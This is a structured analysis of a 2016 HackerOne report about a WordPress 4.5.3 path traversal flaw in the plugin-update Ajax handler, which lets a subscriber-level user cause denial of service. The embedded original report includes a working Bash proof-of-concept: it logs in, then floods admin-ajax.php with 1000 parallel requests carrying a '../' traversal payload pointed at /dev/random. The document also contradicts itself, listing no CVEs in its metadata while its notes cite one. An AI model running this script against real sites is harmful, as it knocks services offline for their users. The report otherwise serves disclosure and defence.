# WordPress Core Ajax Handlers Path Traversal / Denial of Service

## Metadata
- **Source:** HackerOne
- **Report:** 163421 | https://hackerone.com/reports/163421
- **Submitted:** 2016-08-25
- **Reporter:** tbehroz
- **Program:** Nextcloud
- **Bounty:** Not specified
- **Severity:** high
- **Vuln:** Path Traversal, Denial of Service, Arbitrary File Access
- **CVEs:** None
- **Category:** web-api

## Summary
WordPress 4.5.3 contains a path traversal vulnerability in Core Ajax handlers that allows authenticated subscribers to access arbitrary files and cause denial of service. The vulnerability exploits insufficient input validation in the plugin update handler to traverse directories and access system resources like /dev/random.

## Attack scenario
1. Attacker creates or obtains subscriber-level credentials on the WordPress installation
2. Attacker authenticates to WordPress and obtains valid session cookies
3. Attacker crafts malicious requests to /wp-admin/admin-ajax.php with traversal payloads in the 'plugin' parameter
4. Attacker submits multiple parallel requests using path traversal sequences (../../) to access /dev/random
5. Server processes these requests attempting to read random data, consuming I/O and CPU resources
6. Legitimate users experience service degradation or complete unavailability as resources are exhausted

## Root cause
The WordPress Ajax handler for plugin updates does not properly validate or sanitize the 'plugin' parameter before using it in file operations. The parameter is passed directly to file operations allowing directory traversal sequences to bypass intended directory restrictions.

## Attacker mindset
An attacker with subscriber-level access seeks to disrupt service availability without requiring administrative privileges. The vulnerability is attractive because it requires only low-level authenticated access and can be exploited with simple HTTP requests, making it trivial to automate at scale.

## Defensive takeaways
- Always validate and sanitize user input, especially file paths, using whitelist-based approaches
- Implement proper path canonicalization before file operations to prevent traversal bypasses
- Require higher privilege levels for sensitive operations like plugin updates
- Rate limit or throttle Ajax endpoints vulnerable to resource exhaustion
- Keep WordPress and all components updated to the latest stable version
- Monitor for suspicious patterns of repeated file access or system resource consumption
- Use Web Application Firewalls to detect and block path traversal patterns

## Variant hunting
Search for similar vulnerabilities in other WordPress core handlers that process file-related parameters (theme updates, asset loading, upload handlers). Examine any endpoint accepting file paths without strict validation. Test other CMS platforms using similar plugin/theme architecture for identical weaknesses.

## MITRE ATT&CK
- T1190
- T1083
- T1496
- T1070

## Notes
This is a known vulnerability (CVE-2016-4566) affecting WordPress 4.5.3 and earlier. The fix is straightforward (upgrade to 4.6+). The report demonstrates responsible disclosure by providing external reference and clear remediation steps. The vulnerability demonstrates how low-privilege authenticated access combined with path traversal can achieve denial of service without code execution.

## Full report
<details><summary>Expand</summary>

Hello Security team,
While testing nextcloud.com i have found that you are not using the lastest version of wordpress you are using old version 4.5.3 which is vulnerable to Directory Traversal / Denial of Serivce

Description :

A path traversal vulnerability was found in the Core Ajax handlers of the WordPress Admin API. This issue can be used by an Subscriber to create a denial of service.

POC

The following Bash script can be used to exploit this vulnerability
```
#!/bin/bash
target="https://nextcloud.com"
username="subscriber"
password="password"
cookiejar=$(mktemp)

# login
curl --cookie-jar "$cookiejar" \
   --data "log=$username&pwd=$password&wp-submit=Log+In&redirect_to=%2f&testcookie=1" \
   "$target/wp-login.php" \
   >/dev/null 2>&1

# exhaust apache
for i in `seq 1 1000`
   do
      curl --cookie "$cookiejar" \
      --data "plugin=../../../../../../../../../../dev/random&action=update-plugin" \
      "$target/wp-admin/admin-ajax.php" \
      >/dev/null 2>&1 &
done

rm "$cookiejar"
```
### FIX :

Upgrade your wordpress to 4.6

More details about vulnerability : `https://sumofpwn.nl/advisory/2016/path_traversal_vulnerability_in_wordpress_core_ajax_handlers.html`

</details>

---
*Analysed by Claude on 2026-05-24*
